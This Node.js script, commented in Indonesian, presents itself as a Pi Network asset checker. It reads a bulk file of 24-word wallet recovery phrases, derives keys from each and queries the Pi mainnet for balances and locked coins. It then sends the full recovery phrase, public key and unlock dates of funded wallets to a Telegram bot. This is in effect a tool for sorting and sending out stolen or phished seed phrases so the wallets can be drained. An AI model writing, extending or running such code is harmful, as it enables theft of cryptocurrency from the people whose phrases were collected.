// =================================================================
// Skrip Pengecek Aset Akun Pi Network
// Versi: Final (Format waktu natural: jam 4 Sore, jam 12 Siang, dll.)
// =================================================================

const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const StellarSdk = require('stellar-sdk');

// --- PENGATURAN WAJIB ---
const TELEGRAM_BOT_TOKEN = 'TOKEN_BOT';
const TELEGRAM_CHAT_ID = 'ID_TELEGRAM';
// -------------------------

const server = new StellarSdk.Server('https://api.mainnet.minepi.com');

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function kirimTelegram(pesan) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'ISI_DENGAN_TOKEN_BOT_ANDA') {
    console.warn('⚠️ Token atau Chat ID Telegram belum diatur. Pesan tidak dikirim.');
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: pesan,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('❌ Gagal kirim ke Telegram:', error.message);
    if (error.response && error.response.status === 429) {
      console.log('Terkena rate limit Telegram, menunggu 2 detik...');
      await delay(2000);
    }
  }
}

function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  return StellarSdk.Keypair.fromRawEd25519Seed(key);
}

const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line && line.split(' ').length === 24);

fs.writeFileSync('valid_with_lockup.txt', '');
fs.writeFileSync('valid_no_lockup.txt', '');
fs.writeFileSync('invalid.txt', '');

async function cekSemua() {
  console.log(`====================================================`);
  console.log(`Memulai pengecekan untuk ${mnemonics.length} mnemonic...`);
  console.log(`Hasil akan disimpan di:`);
  console.log(`- valid_with_lockup.txt (Ada koin terkunci)`);
  console.log(`- valid_no_lockup.txt (Terdaftar tapi kosong)`);
  console.log(`- invalid.txt (Tidak terdaftar)`);
  console.log(`====================================================`);

  for (const [index, mnemonic] of mnemonics.entries()) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      const account = await server.loadAccount(pubkey);

      const claimableBalances = await server.claimableBalances().claimant(pubkey).limit(50).call();

      if (claimableBalances.records.length > 0) {
        console.log(`[${index + 1}/${mnemonics.length}] ✅ DITEMUKAN: Akun dengan lockup! Public Key: ${pubkey}`);
        fs.appendFileSync('valid_with_lockup.txt', `${mnemonic}\n`);

        const piBalance = account.balances.find(b => b.asset_type !== 'native');
        const saldoTersedia = piBalance ? parseFloat(piBalance.balance).toFixed(7) : '0.0000000';
        
        let pesanLockup = "\n\n🔒 *Rincian Koin Terkunci:*\n";
        let totalTerkunci = 0;

        claimableBalances.records.forEach(record => {
          const amount = parseFloat(record.amount);
          totalTerkunci += amount;

          const userClaimant = record.claimants.find(c => c.destination === pubkey);
          
          if (userClaimant && userClaimant.predicate && userClaimant.predicate.not && userClaimant.predicate.not.abs_before) {
            const unlockDate = userClaimant.predicate.not.abs_before;
            
            // =========================================================================
            // === LOGIKA BARU UNTUK FORMAT WAKTU NATURAL SESUAI PERMINTAAN ANDA ===
            // =========================================================================
            const dateObj = new Date(unlockDate);
            const options = { timeZone: 'Asia/Jakarta' };

            // 1. Ambil bagian tanggal (misal: "17 Agustus 2024")
            const tanggalFormatted = dateObj.toLocaleDateString('id-ID', { ...options, year: 'numeric', month: 'long', day: 'numeric' });

            // 2. Ambil komponen waktu untuk logika
            const jam24 = parseInt(dateObj.toLocaleString('id-ID', { ...options, hour: '2-digit', hour12: false }));
            const menit = dateObj.toLocaleString('id-ID', { ...options, minute: '2-digit' });
            const detik = dateObj.toLocaleString('id-ID', { ...options, second: '2-digit' });

            // 3. Konversi jam 24 ke format 12 (1-12)
            let jam12 = jam24 % 12;
            if (jam12 === 0) {
                jam12 = 12; // Jam 0 (tengah malam) & jam 12 (siang) menjadi 12
            }

            // 4. Tentukan keterangan waktu berdasarkan jam 24
            let keteranganWaktu;
            if (jam24 >= 4 && jam24 < 6) {
                keteranganWaktu = 'Subuh';
            } else if (jam24 >= 6 && jam24 < 11) {
                keteranganWaktu = 'Pagi';
            } else if (jam24 >= 11 && jam24 < 15) {
                keteranganWaktu = 'Siang';
            } else if (jam24 >= 15 && jam24 < 19) {
                keteranganWaktu = 'Sore';
            } else { // Termasuk jam 19-23 (malam) dan 0-3 (dini hari/malam)
                keteranganWaktu = 'Malam';
            }

            // 5. Gabungkan semua menjadi format akhir yang diinginkan
            const tanggalUnlockLengkap = `${tanggalFormatted}, jam ${jam12}:${menit}:${detik} ${keteranganWaktu}`;
            // ======================= AKHIR DARI LOGIKA BARU ========================

            pesanLockup += ` - *${amount.toFixed(2)} Pi* (Buka Kunci: ${tanggalUnlockLengkap})\n`;
          } else {
            pesanLockup += ` - *${amount.toFixed(2)} Pi* (Tanggal buka kunci tidak terdeteksi)\n`;
          }
        });
        
        const pesan = `✅ *Akun Pi Ditemukan (ADA LOCKUP)!*\n\n` +
                      `🔑 *Mnemonic:*\n\`${mnemonic}\`\n\n` +
                      `👤 *Public Key:*\n\`${pubkey}\`\n\n` +
                      `--- Rincian Aset ---\n` +
                      `💰 *Saldo Tersedia:*\n\`${saldoTersedia} Pi\`\n\n` +
                      `🔐 *Total Terkunci:*\n\`${totalTerkunci.toFixed(7)} Pi\`\n` +
                      `${pesanLockup}`;

        await kirimTelegram(pesan);

      } else {
        console.log(`[${index + 1}/${mnemonics.length}] ℹ️ Terdaftar, namun tidak ada lockup. Public Key: ${pubkey}`);
        fs.appendFileSync('valid_no_lockup.txt', `${mnemonic}\n`);
      }

    } catch (err) {
      if (err.response && err.response.status === 404) {
        const keypair = mnemonicToStellarKeypair(mnemonic);
        const pubkey = keypair.publicKey();
        console.log(`[${index + 1}/${mnemonics.length}] ❌ Tidak terdaftar. Public Key: ${pubkey}`);
        fs.appendFileSync('invalid.txt', `${mnemonic}\n`);
      } else {
        console.error(`[${index + 1}/${mnemonics.length}] ⚠️ Error saat cek mnemonic: ${mnemonic.substring(0, 15)}...`);
        console.error(`   Pesan Error: ${err.message || 'Error tidak diketahui'}`);
      }
    }

    await delay(2000); 
  }

  console.log('====================================================');
  console.log('Selesai. Semua mnemonic telah berhasil dicek.');
  console.log('====================================================');
}

cekSemua();
